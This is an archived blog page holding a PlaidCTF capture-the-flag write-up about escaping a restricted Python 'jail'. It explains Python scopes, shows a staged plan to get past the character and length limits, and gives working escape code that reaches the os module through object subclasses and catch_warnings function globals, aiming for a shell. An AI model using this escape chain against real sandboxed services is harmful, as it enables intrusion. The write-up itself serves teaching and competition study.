&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[])=
)),`</span><span class=3D"s">'</span><span class=3D"si">%</span><span class=
=3D"se">\xcb</span><span class=3D"s">'</span><span class=3D"sb">`[{}&lt;[]:=
:~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&=
lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`<=
/span><span class=3D"s">'</span><span class=3D"si">%</span><span class=3D"s=
e">\xcb</span><span class=3D"s">'</span><span class=3D"sb">`[{}&lt;[]::~(~(=
{}&lt;[])&lt;&lt;({}&lt;[]))]%(~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&=
lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;=
&lt;({}&lt;[]))),`</span><span class=3D"s">'</span><span class=3D"si">%</sp=
an><span class=3D"se">\xcb</span><span class=3D"s">'</span><span class=3D"s=
b">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(((~(~(~({}&lt;[])&lt;&=
lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;=
&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`</span><span class=3D"s">'</span><span=
 class=3D"si">%</span><span class=3D"se">\xcb</span><span class=3D"s">'</sp=
an><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(((~=
(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt=
;({}&lt;[]))&lt;&lt;({}&lt;[])))]`</span><span class=3D"p">[(({}</span><spa=
n class=3D"o">&lt;</span><span class=3D"p">[])</span><span class=3D"o">&lt;=
&lt;</span><span class=3D"p">({}</span><span class=3D"o">&lt;</span><span c=
lass=3D"p">[]))::</span><span class=3D"o">~</span><span class=3D"p">(</span=
><span class=3D"o">~</span><span class=3D"p">(({}</span><span class=3D"o">&=
lt;</span><span class=3D"p">[])</span><span class=3D"o">&lt;&lt;</span><spa=
n class=3D"p">({}</span><span class=3D"o">&lt;</span><span class=3D"p">[]))=
</span><span class=3D"o">&lt;&lt;</span><span class=3D"p">({}</span><span c=
lass=3D"o">&lt;</span><span class=3D"p">[]))]</span>
</code></pre></div></div>

<h1 id=3D"about-python-scopes">About python scopes</h1>

<p>At this stage, and before trying to exploit anything, I think it might b=
e useful
to give a quick aper=C3=A7u of how python handles scopes. This won=E2=80=99=
t explain
everything there is to know about it and I strongly suggest you should read=
 more
about it is your are interested. If, however, you feel perfectly comfortabl=
e
with the way python handles and stores this stuff you may safely skip this
section.</p>

<p>There are two kinds of variables that I will talk about, namely <em>glob=
al</em> and
<em>local</em> variables. Of course, being python, there is no real differe=
nce between
the way a variable referring to a number, a class or a function, is handled=
.</p>

<h2 id=3D"globals">globals</h2>

<p>What we usually call global variables are not in fact global in the same=
 sense
as global variables in C would be. They are only global relative to the mod=
ule
in which they are defined. When accessing them from outside there module yo=
u
would do for example: <code class=3D"highlighter-rouge">math.pi</code> to a=
ccess the global variable named <code class=3D"highlighter-rouge">'pi'</cod=
e> in
the module <code class=3D"highlighter-rouge">'math'</code>.</p>

<p>All the global variables in a module are stored in the module=E2=80=99s =
<code class=3D"highlighter-rouge">__dict__</code> which
is an attribute of the module. Modifing this <code class=3D"highlighter-rou=
ge">__dict__</code> has the same effect as
using <code class=3D"highlighter-rouge">setattr</code> on the module.</p>

<p>One can get the current module=E2=80=99s globals doing <code class=3D"hi=
ghlighter-rouge">sys.modules[__name__].__dict__</code>,
or more simply by calling <code class=3D"highlighter-rouge">globals()</code=
>.</p>

<h2 id=3D"locals">locals</h2>

<p>Local variables are those defined inside the scope of a function. In a w=
ay
similar to global variables, locals are stored in a dictionary that can be
accessed through the <code class=3D"highlighter-rouge">f_locals</code> attr=
ibute of the code frame in which the
function is/was running. In the CPython implementation modifying the <code =
class=3D"highlighter-rouge">f_locals</code>
wont affect the actual locals.</p>

<h2 id=3D"from-the-outside">from the outside</h2>

<p>If we take a look at the code of <code class=3D"highlighter-rouge">math.=
cos</code> we might expect it to use <code class=3D"highlighter-rouge">math=
.pi</code>,
but it will probably be simply referenced as <code class=3D"highlighter-rou=
ge">pi</code>. When we call <code class=3D"highlighter-rouge">math.cos</cod=
e> from
somewhere outside of math, <code class=3D"highlighter-rouge">pi</code> wont=
 be in the globals of the calling
module. Its interesting to learn how <code class=3D"highlighter-rouge">cos<=
/code> finds the reference on <code class=3D"highlighter-rouge">pi</code>. =
During
the declaration of the function, a reference to the current globals (those =
of
the module in which it is declared) is kept in the function=E2=80=99s <code=
 class=3D"highlighter-rouge">func_globals</code>
attribute.</p>

<h1 id=3D"exploiting">Exploiting</h1>

<p>We are now able to run code quiet easily and the character problems are =
mostly
solved. (We still can=E2=80=99t use some characters but we shall do without=
 them)
However, some limits still remain. No builtins, no access to modules, and a
character limit. Let=E2=80=99s solve that last problem first, that way it w=
on=E2=80=99t bother
us afterwards.</p>

<h2 id=3D"solving-the-length-limit">Solving the length limit</h2>

<p>To achieve this we shall add a third execution stage, the second stage (=
the
original exec statement), which can be triggered as many times as we want,
will be tasked with building the final payload. For this it will need to st=
ore
the query parts somewhere, and concatenate the new parts as they arrive.</p=
>

<p>We need a place to store stuff where we can comeback in the next exec. F=
inding
a place where we can comeback is easy.</p>

<p>If you have ever done any kind of python jail-escaping the following sho=
uld be
familiar to you.</p>

<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
pre class=3D"highlight"><code><span class=3D"p">()</span><span class=3D"o">=
.</span><span class=3D"n">__class__</span><span class=3D"o">.</span><span c=
lass=3D"n">__base__</span><span class=3D"o">.</span><span class=3D"n">__sub=
classes__</span><span class=3D"p">()</span>
</code></pre></div></div>

<p>This get=E2=80=99s the <code class=3D"highlighter-rouge">tuple</code>=E2=
=80=99s type=E2=80=99s (<code class=3D"highlighter-rouge">().__class__</cod=
e>) parent (<code class=3D"highlighter-rouge">__base__</code>) which is
<code class=3D"highlighter-rouge">object</code>, then lists all its subclas=
ses that python knows of. Somewhere in those
we should be able to find one which we are allowed to call <code class=3D"h=
ighlighter-rouge">setattr</code> on. Indeed
we are lucky and find:</p>

<pre><code class=3D"language-pycon">&gt;&gt;&gt; ().__class__.__base__.__su=
bclasses__()[-2]
&lt;class 'codecs.IncrementalDecoder'&gt;

&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[-2].test =3D "wapiflapi=
"
&gt;&gt;&gt; print ().__class__.__base__.__subclasses__()[-2].test
wapiflapi
</code></pre>

<p><strong>All the code should work on python 2.6.6, but it is trivial to a=
dapt to other versions.</strong></p>

<p>Neat, we can store stuff in this and come back to it later. That=E2=80=
=99s all we need
for our second stage, we are ready to receive the parts from eval, concaten=
ate
them into our storage and finally exec the whole payload when we are done.<=
/p>

<h4 id=3D"battle-plan">Battle plan:</h4>

<ul>
  <li>Stage 1, original <code class=3D"highlighter-rouge">eval()</code>
    <ul>
      <li>Decode input and generate the python code</li>
      <li><strong>This bypasses the character limit</strong></li>
    </ul>
  </li>
  <li>Stage 2, original <code class=3D"highlighter-rouge">exec</code>
    <ul>
      <li>Concatenate stage 1=E2=80=99s output</li>
      <li>exec when ready</li>
      <li><strong>This bypasses the length limit</strong></li>
    </ul>
  </li>
  <li>Stage 3, <code class=3D"highlighter-rouge">exec</code> by stage 2
    <ul>
      <li>Actual payload, will hopefully get us a shell</li>
      <li><strong>This gets out of jail</strong></li>
    </ul>
  </li>
</ul>

<p>This basically solves the problem at hand (the length limit), the code i=
s
pretty trivial and will be shown later when putting everything together. Le=
t=E2=80=99s
first find-out how to really escape from jail.</p>

<h2 id=3D"getting-out">Getting out</h2>

<p>We want a shell, we want <code class=3D"highlighter-rouge">system</code>=
, <code class=3D"highlighter-rouge">execv</code>, <code class=3D"highlighte=
r-rouge">fork</code>, <code class=3D"highlighter-rouge">dup</code>, in shor=
t we want the
<code class=3D"highlighter-rouge">os</code> module. Where can we find it? W=
e need to look for a module or function that
has a reference on <code class=3D"highlighter-rouge">os</code> or on someth=
ing that has a reference on something like
that. Here experience plays a big role, and we know from experience that th=
e
warnings module is loaded by default and has a lot of <em>nice</em> referen=
ces. If we
can get its globals we should be fine.</p>

<p>What we normally try, and it worked for the NDH Prequals is :</p>

<pre><code class=3D"language-pycon">&gt;&gt;&gt; [x for x in ().__class__._=
_base__.__subclasses__() if x.__name__ =3D=3D "catch_warnings"][0]()._modul=
e
&lt;module 'warnings' from '/usr/lib/python2.7/warnings.pyc'&gt;
</code></pre>

<p>This gives us the module straightaway, no questions asked. It=E2=80=99s =
so easy because
<code class=3D"highlighter-rouge">catch_warnings</code> keeps a reference t=
o its module. But it didn=E2=80=99t work this time
because <code class=3D"highlighter-rouge">catch_warnings</code> uses <code =
class=3D"highlighter-rouge">sys.modules</code> to get that reference, and t=
hus it
fails. (They are <code class=3D"highlighter-rouge">.clear()</code>ed, remem=
ber?)</p>

<pre><code class=3D"language-pytb">Traceback (most recent call last):
  File "/Python-2.6.6/Lib/warnings.py", line 333, in __init__
    self._module =3D sys.modules['warnings'] if module is None else module
KeyError: 'warnings'
</code></pre>

<p>But we still have a way of getting that reference, we saw that functions=
 kept
a reference to the globals of the modules in which they where defined. We o=
nly
have to find a real function in <code class=3D"highlighter-rouge">catch_war=
nings</code> and we should be good to go.</p>

<p>After some searching we find out <code class=3D"highlighter-rouge">catch=
_warnings.__repr__</code> is backed by a real
function. <code class=3D"highlighter-rouge">__repr__</code> itself is an =
=E2=80=98instancemethod=E2=80=99 not a function, but it=E2=80=99s
trivial to get the function using <code class=3D"highlighter-rouge">__repr_=
_.im_func</code></p>

<p>Then it=E2=80=99s only a matter of getting <code class=3D"highlighter-ro=
uge">warnings'</code> globals using <code class=3D"highlighter-rouge">func_=
global</code> which
is a reference to it.</p>

<pre><code class=3D"language-pycon">&gt;&gt;&gt; g_warnings =3D [x for x in=
 ().__class__.__base__.__subclasses__() if x.__name__ =3D=3D "catch_warning=
s"][0].__repr__.im_func.func_globals
&gt;&gt;&gt; print g_warnings["linecache"].os
&lt;module 'os' from '/Python-2.6.6/Lib/os.pyc'&gt;
</code></pre>

<p><code class=3D"highlighter-rouge">warnings</code> imports <code class=3D=
"highlighter-rouge">linecache</code> which in turn imports <code class=3D"h=
ighlighter-rouge">os</code>. We don=E2=80=99t import
anything and that is why doing things like this doesn=E2=80=99t disturb the=
 broken
mess caused by <code class=3D"highlighter-rouge">sys.modules.clear()</code>=
.</p>

<h1 id=3D"reunion">Reunion</h1>

<p>Now we know everything. We know how to escape the jail, we know how to h=
ave
enough space to do so and we know how to use the characters we want to craf=
t our
code. The only think we miss is putting all this together. And it=E2=80=99s=
 pretty easy.</p>

<p>I=E2=80=99d like to thank PPP for their CTF, I really enjoyed it. Also t=
hank you to all
the people who helped me learning python and some of its <em>secrets</em>.<=
/p>


   =20



<div class=3D"post-tags">
 =20
    <span>
      <span class=3D"icon">
        <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"=
24" xmlns=3D"http://www.w3.org/2000/svg">
    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
    <path d=3D"M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 =
7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"><=
/path>
</svg>
      </span>&nbsp;<span class=3D"tag-name">jail</span>
    </span>
 =20
    <span>
      <span class=3D"icon">
        <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"=
24" xmlns=3D"http://www.w3.org/2000/svg">
    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
    <path d=3D"M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 =
7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"><=
/path>
</svg>
      </span>&nbsp;<span class=3D"tag-name">CTF</span>
    </span>
 =20
    <span>
      <span class=3D"icon">
        <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"=
24" xmlns=3D"http://www.w3.org/2000/svg">
    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
    <path d=3D"M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 =
7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"><=
/path>
</svg>
      </span>&nbsp;<span class=3D"tag-name">PlaidCTF</span>
    </span>
 =20
    <span>
      <span class=3D"icon">
        <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"=
24" xmlns=3D"http://www.w3.org/2000/svg">
    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
    <path d=3D"M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 =
7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"><=
/path>
</svg>
      </span>&nbsp;<span class=3D"tag-name">escape</span>
    </span>
 =20
    <span>
      <span class=3D"icon">
        <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"=
24" xmlns=3D"http://www.w3.org/2000/svg">
    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
    <path d=3D"M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 =
7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"><=
/path>
</svg>
      </span>&nbsp;<span class=3D"tag-name">writeup</span>
    </span>
 =20
    <span>
      <span class=3D"icon">
        <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"=
24" xmlns=3D"http://www.w3.org/2000/svg">
    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
    <path d=3D"M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 =
7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"><=
/path>
</svg>
      </span>&nbsp;<span class=3D"tag-name">python</span>
    </span>
 =20
    <span>
      <span class=3D"icon">
        <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"=
24" xmlns=3D"http://www.w3.org/2000/svg">
    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
    <path d=3D"M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 =
7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"><=
/path>
</svg>
      </span>&nbsp;<span class=3D"tag-name">pyjail</span>
    </span>
 =20
</div>
  </div>

 =20
  <section class=3D"comments">
    <h2>Comments</h2>
   =20

  </section>

  <section class=3D"related">
  <h2>Related Posts</h2>
  <ul class=3D"posts-list">
   =20
      <li>
        <h3>
          <a href=3D"https://wapiflapi.github.io/2019/10/10/efficiency-reve=
rse-engineering-with-ghidra.html">
            Efficiency: Reverse Engineering with ghidra
            <small>10 Oct 2019</small>
          </a>
        </h3>
      </li>
   =20
      <li>
        <h3>
          <a href=3D"https://wapiflapi.github.io/2015/10/29/eight-byte-shel=
l.html">
            Eight bytes to get a shell.
            <small>29 Oct 2015</small>
          </a>
        </h3>
      </li>
   =20
      <li>
        <h3>
          <a href=3D"https://wapiflapi.github.io/2015/04/22/single-null-byt=
e-heap-overflow.html">
            Visualizing a single null-byte heap overflow exploitation
            <small>22 Apr 2015</small>
          </a>
        </h3>
      </li>
   =20
  </ul>
</section>

</div>

    </main>

    <!-- Optional footer content -->

 =20

<div id=3D"fatkun-drop-panel">
        <a id=3D"fatkun-drop-panel-close-btn">=C3=97</a>
            <div id=3D"fatkun-drop-panel-inner">
                <div class=3D"fatkun-content">
                    <svg class=3D"fatkun-icon" viewBox=3D"0 0 1024 1024" ve=
rsion=3D"1.1" xmlns=3D"http://www.w3.org/2000/svg" p-id=3D"5892"><path d=3D=
"M494.933333 782.933333c2.133333 2.133333 4.266667 4.266667 8.533334 6.4h8.=
533333c6.4 0 10.666667-2.133333 14.933333-6.4l2.133334-2.133333 275.2-275.2=
c8.533333-8.533333 8.533333-21.333333 0-29.866667-8.533333-8.533333-21.3333=
33-8.533333-29.866667 0L533.333333 716.8V128c0-12.8-8.533333-21.333333-21.3=
33333-21.333333s-21.333333 8.533333-21.333333 21.333333v588.8L249.6 475.733=
333c-8.533333-8.533333-21.333333-8.533333-29.866667 0-8.533333 8.533333-8.5=
33333 21.333333 0 29.866667l275.2 277.333333zM853.333333 874.666667H172.8c-=
12.8 0-21.333333 8.533333-21.333333 21.333333s8.533333 21.333333 21.333333 =
21.333333H853.333333c12.8 0 21.333333-8.533333 21.333334-21.333333s-10.6666=
67-21.333333-21.333334-21.333333z" p-id=3D"5893"></path></svg>
                    <div class=3D"fatkun-title">=E6=8B=96=E6=8B=BD=E5=88=B0=
=E6=AD=A4=E5=A4=84</div>
                    <div class=3D"fatkun-desc">=E5=9B=BE=E7=89=87=E5=B0=86=
=E5=AE=8C=E6=88=90=E4=B8=8B=E8=BD=BD</div>
                </div>
            </div>
    </div></body></html>
------MultipartBoundary--HOuxZ2DQ0gQYS6F4mCJUmsOk3TTuYF8VKIn3YnDj2R----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: https://wapiflapi.github.io/assets/css/main.css

@charset "utf-8";

* { box-sizing: border-box; }

html, body { margin: 0px; padding: 0px; }

html { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, =
Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", Ari=
al, sans-serif; font-size: 1rem; line-height: 1.5; }

@media (min-width: 49rem) {
  html { font-size: 1.25rem; }
}

body { text-size-adjust: 100%; }

main, article, section { display: block; }

a { color: rgb(38, 139, 210); text-decoration: none; }

a:hover, a:focus { text-decoration: underline; }

a strong { color: inherit; }

img { display: block; max-width: 100%; margin: 0px 0px 1rem; border-radius:=
 5px; height: auto; }

table { margin-bottom: 1rem; width: 100%; font-size: 85%; border: 1px solid=
 rgb(229, 229, 229); border-collapse: collapse; }

td, th { padding: 0.25rem 0.5rem; border: 1px solid rgb(229, 229, 229); }

th { text-align: left; }

tbody tr:nth-child(2n+1) td, tbody tr:nth-child(2n+1) th { background-color=
: rgb(249, 249, 249); }

input[type=3D"text"], input[type=3D"email"], input[type=3D"search"], input[=
type=3D"submit"], button { padding: 1em 1.5em; border: 1px solid rgb(229, 2=
29, 229); border-radius: 300px; }

button, input[type=3D"submit"] { cursor: pointer; background: transparent; =
border-color: rgb(229, 229, 229); color: rgb(38, 139, 210); transition: col=
or 0.6s ease-in-out 0s, border-color 0.6s ease-in-out 0s, background 0.6s e=
ase-in-out 0s; }

button:hover, input[type=3D"submit"]:hover { background: rgb(38, 139, 210);=
 border-color: rgb(38, 139, 210); color: white; box-shadow: rgba(0, 0, 0, 0=
.16) 1px 1px 1px; }

h1, h2, h3, h4, h5, h6, .site-title { margin-bottom: 0.5rem; font-weight: 6=
00; line-height: 1.25; color: rgb(49, 49, 49); text-rendering: optimizelegi=
bility; }

h1 { font-size: 2rem; }

h2 { margin-top: 1rem; font-size: 1.5rem; }

h3 { margin-top: 1.5rem; font-size: 1.25rem; }

h4, h5, h6 { margin-top: 1rem; font-size: 1rem; }

p { margin-top: 0px; margin-bottom: 1rem; }

strong { color: rgb(48, 48, 48); }

ul, ol, dl { margin-top: 0px; margin-bottom: 1rem; }

dt { font-weight: bold; }

dd { margin-bottom: 0.5rem; }

hr { position: relative; margin: 1.5rem 0px; border-width: 1px 0px; border-=
right-style: initial; border-left-style: initial; border-right-color: initi=
al; border-left-color: initial; border-image: initial; border-top-style: so=
lid; border-top-color: rgb(238, 238, 238); border-bottom-style: solid; bord=
er-bottom-color: rgb(255, 255, 255); }

abbr { font-size: 85%; font-weight: bold; color: rgb(85, 85, 85); text-tran=
sform: uppercase; }

abbr[title] { cursor: help; border-bottom: 1px dotted rgb(229, 229, 229); }

blockquote { padding: 0.5rem 1rem; margin: 0.8rem 0px; color: rgb(122, 122,=
 122); border-left: 0.25rem solid rgb(229, 229, 229); }

blockquote p:last-child { margin-bottom: 0px; }

@media (min-width: 30em) {
  blockquote { padding-right: 5rem; padding-left: 1.25rem; }
}

a[href^=3D"#fn:"], a[href^=3D"#fnref:"] { display: inline-block; margin-lef=
t: 0.1rem; font-weight: bold; }

.footnotes { margin-top: 2rem; font-size: 85%; }

.lead { font-size: 1.25rem; font-weight: 300; }

a svg, .icon svg { height: 1em; }

a svg { fill: rgb(38, 139, 210); }

.icon { vertical-align: middle; }

.highlight .hll { background-color: rgb(255, 255, 204); }

.highlight .c { color: rgb(153, 153, 153); }

.highlight .err { color: rgb(170, 0, 0); background-color: rgb(255, 170, 17=
0); }

.highlight .k { color: rgb(0, 102, 153); }

.highlight .o { color: rgb(85, 85, 85); }

.highlight .cm { color: rgb(0, 153, 255); font-style: italic; }

.highlight .cp { color: rgb(0, 153, 153); }

.highlight .c1 { color: rgb(153, 153, 153); }

.highlight .cs { color: rgb(153, 153, 153); }

.highlight .gd { background-color: rgb(255, 204, 204); border: 1px solid rg=
b(204, 0, 0); }

.highlight .ge { font-style: italic; }

.highlight .gr { color: red; }

.highlight .gh { color: rgb(0, 51, 0); }

.highlight .gi { background-color: rgb(204, 255, 204); border: 1px solid rg=
b(0, 204, 0); }

.highlight .go { color: rgb(170, 170, 170); }

.highlight .gp { color: rgb(0, 0, 153); }

.highlight .gu { color: rgb(0, 51, 0); }

.highlight .gt { color: rgb(153, 204, 102); }

.highlight .kc { color: rgb(0, 102, 153); }

.highlight .kd { color: rgb(0, 102, 153); }

.highlight .kn { color: rgb(0, 102, 153); }

.highlight .kp { color: rgb(0, 102, 153); }

.highlight .kr { color: rgb(0, 102, 153); }

.highlight .kt { color: rgb(0, 119, 136); }

.highlight .m { color: rgb(255, 102, 0); }

.highlight .s { color: rgb(212, 73, 80); }

.highlight .na { color: rgb(79, 159, 207); }

.highlight .nb { color: rgb(51, 102, 102); }

.highlight .nc { color: rgb(0, 170, 136); }

.highlight .no { color: rgb(51, 102, 0); }

.highlight .nd { color: rgb(153, 153, 255); }

.highlight .ni { color: rgb(153, 153, 153); }

.highlight .ne { color: rgb(204, 0, 0); }

.highlight .nf { color: rgb(204, 0, 255); }

.highlight .nl { color: rgb(153, 153, 255); }

.highlight .nn { color: rgb(0, 204, 255); }

.highlight .nt { color: rgb(47, 111, 159); }

.highlight .nv { color: rgb(0, 51, 51); }

.highlight .ow { color: rgb(0, 0, 0); }

.highlight .w { color: rgb(187, 187, 187); }

.highlight .mf { color: rgb(255, 102, 0); }

.highlight .mh { color: rgb(255, 102, 0); }

.highlight .mi { color: rgb(255, 102, 0); }

.highlight .mo { color: rgb(255, 102, 0); }

.highlight .sb { color: rgb(204, 51, 0); }

.highlight .sc { color: rgb(204, 51, 0); }

.highlight .sd { color: rgb(204, 51, 0); font-style: italic; }

.highlight .s2 { color: rgb(204, 51, 0); }

.highlight .se { color: rgb(204, 51, 0); }

.highlight .sh { color: rgb(204, 51, 0); }

.highlight .si { color: rgb(170, 0, 0); }

.highlight .sx { color: rgb(204, 51, 0); }

.highlight .sr { color: rgb(51, 170, 170); }

.highlight .s1 { color: rgb(204, 51, 0); }

.highlight .ss { color: rgb(255, 204, 51); }

.highlight .bp { color: rgb(51, 102, 102); }

.highlight .vc { color: rgb(0, 51, 51); }

.highlight .vg { color: rgb(0, 51, 51); }

.highlight .vi { color: rgb(0, 51, 51); }

.highlight .il { color: rgb(255, 102, 0); }

.css .o, .css .o + .nt, .css .nt + .nt { color: rgb(153, 153, 153); }

code, pre { font-family: Menlo, Monaco, "Courier New", monospace; }

code { padding: 0.25em 0.5em; font-size: 85%; color: rgb(191, 97, 106); bac=
kground-color: rgb(249, 249, 249); border-radius: 3px; }

pre { margin-top: 0px; margin-bottom: 1rem; }

pre code { padding: 0px; font-size: 100%; color: inherit; background-color:=
 transparent; }

.highlight { padding: 1rem; margin-bottom: 1rem; font-size: 0.8rem; line-he=
ight: 1.4; background-color: rgb(249, 249, 249); border-radius: 0.25rem; }

.highlight pre { margin-bottom: 0px; overflow-x: auto; }

.highlight .lineno { display: inline-block; padding-right: 0.75rem; padding=
-left: 0.25rem; color: rgb(153, 153, 153); user-select: none; }

pre { max-width: 100%; overflow-x: auto; }

body { color: rgba(255, 255, 255, 0.75); background-color: rgb(32, 32, 32);=
 background-image: linear-gradient(rgb(50, 50, 50), rgb(14, 14, 14)); displ=
ay: flex; flex-direction: column; min-width: 100vw; min-height: 100vh; }

#sidebar { flex: 0 0 auto; padding: 2rem; }

#sidebar .site-title { font-family: "Abril Fatface", serif; font-weight: no=
rmal; font-size: 1.25rem; margin-top: 0px; margin-bottom: 0.5rem; }

#sidebar .site-title .back-arrow { margin-right: 0.5rem; }

.container { flex: 1 1 auto; display: flex; flex-direction: column; }

.container > .content { flex-grow: 1; padding-bottom: 4rem; }

.content { background: rgb(255, 255, 255); color: rgb(81, 81, 81); padding:=
 2rem; }

#sidebar header ~ *, #sidebar header ~ nav, #sidebar p.lead { display: none=
; }

.container > header { color: rgb(255, 255, 255); background: transparent; m=
argin: -1.5rem 2rem 2rem; }

.container > header h1, .container > header h2 { color: inherit; }

.container > header h1:last-child, .container > header h2:last-child { marg=
in-bottom: 0px; }

.home #sidebar { text-align: center; }

.home #sidebar .site-title { font-size: 3.25rem; }

.home #sidebar header ~ *, .home #sidebar p.lead { display: block; }

.home #sidebar header ~ nav { display: flex; }

.home #sidebar > :last-child { margin-bottom: 0.5rem; }

@media (min-width: 49rem) {
  body { flex-direction: row; height: 100vh; overflow-y: auto; }
  body > * { max-height: 100vh; overflow-y: auto; }
  #sidebar, .home #sidebar { width: 18rem; text-align: left; }
  #sidebar > :last-child, .home #sidebar > :last-child { margin-bottom: 0px=
; }
  #sidebar .site-title { font-size: 3.25rem; }
  #sidebar .site-title .back-arrow { display: none; }
  #sidebar p.lead, #sidebar header ~ * { display: block; }
  #sidebar header ~ nav { display: flex; }
  .index #sidebar { margin-bottom: 0px; }
  .container { background: rgb(255, 255, 255); color: rgb(81, 81, 81); padd=
ing: 4rem 4rem 0px; height: 100vh; }
  .container > header { color: rgb(49, 49, 49); margin: 0px; }
  .container > header h1, .container > header h2 { color: inherit; }
  .container > header h1:last-child, .container > header h2:last-child { ma=
rgin-bottom: 0.5rem; }
  .container > * { max-width: 38rem; padding: 0px; }
}

#sidebar a { color: rgb(255, 255, 255); }

#sidebar a svg { fill: rgba(255, 255, 255, 0.85); }

#sidebar a:hover svg, #sidebar a:focus svg, #sidebar a.active svg { fill: r=
gba(255, 255, 255, 0.85); }

#sidebar a:hover, #sidebar a:focus { text-decoration: underline; }

#sidebar a:hover.icon, #sidebar a:focus.icon { text-decoration: none; }

#sidebar a.active { font-weight: bold; }

#sidebar .site-title { color: rgb(255, 255, 255); }

#sidebar .site-title a { color: inherit; }

#sidebar nav { display: flex; }

#sidebar-nav-links { flex-flow: column nowrap; }

#sidebar-icon-links { max-width: 100%; flex-flow: row wrap; justify-content=
: center; margin-top: 1rem; }

@media (min-width: 49rem) {
  #sidebar-icon-links { margin-left: -0.25em; justify-content: flex-start; =
}
}

#sidebar nav > * { display: block; line-height: 1.75; }

#sidebar nav > .icon { font-size: 1.5rem; display: inline-block; margin: 0p=
x 0.25em; }

@media (min-width: 49rem) {
  body { align-items: flex-end; }
}

.masthead { padding-top: 1rem; padding-bottom: 1rem; margin-bottom: 3rem; }

.masthead-title { margin-top: 0px; margin-bottom: 0px; color: rgb(81, 81, 8=
1); }

.masthead-title a { color: inherit; }

.masthead-title small { font-size: 75%; font-weight: 400; opacity: 0.5; }

article + *, .post-body ~ section { padding-top: 2rem; border-top: 1px soli=
d rgb(229, 229, 229); margin-top: 2rem; }

article + * > h2:first-child, article + * > h3:first-child, .post-body ~ se=
ction > h2:first-child, .post-body ~ section > h3:first-child { margin-top:=
 0px; }

.post .content li + li, .page .content li + li { margin-top: 0.25rem; }

.page-title, .post-title, .post-title a { color: rgb(49, 49, 49); }

.page-title, .post-title { margin-top: 0px; }

h2.post-title, h2.page-title { font-size: 2rem; }

.post-meta { margin-top: -0.5rem; margin-bottom: 1rem; color: rgb(118, 118,=
 118); }

.post-tags a { font-size: 0.8em; margin-right: 0.5rem; white-space: nowrap;=
 opacity: 0.75; }

.post-tags a .tag-name { text-transform: capitalize; }

.post-tags a:hover { text-decoration: none; opacity: 1; }

.posts-by-tag h2 { text-transform: capitalize; }

.posts-list { padding-left: 0px; list-style: none; }

.posts-list h3 { margin-top: 0px; }

.posts-list li small { font-size: 75%; color: rgb(153, 153, 153); white-spa=
ce: nowrap; }

.posts-list li a:hover { color: rgb(38, 139, 210); text-decoration: none; }

.posts-list li a:hover small { color: inherit; }

button.disqus-load { margin-top: 1em; }

.pagination { margin-bottom: 2rem; color: rgb(204, 204, 204); text-align: c=
enter; }

.pagination > a { display: inline-block; padding: 1em 1.5em; border: 1px so=
lid rgb(229, 229, 229); border-radius: 300px; width: 60%; max-width: 18rem;=
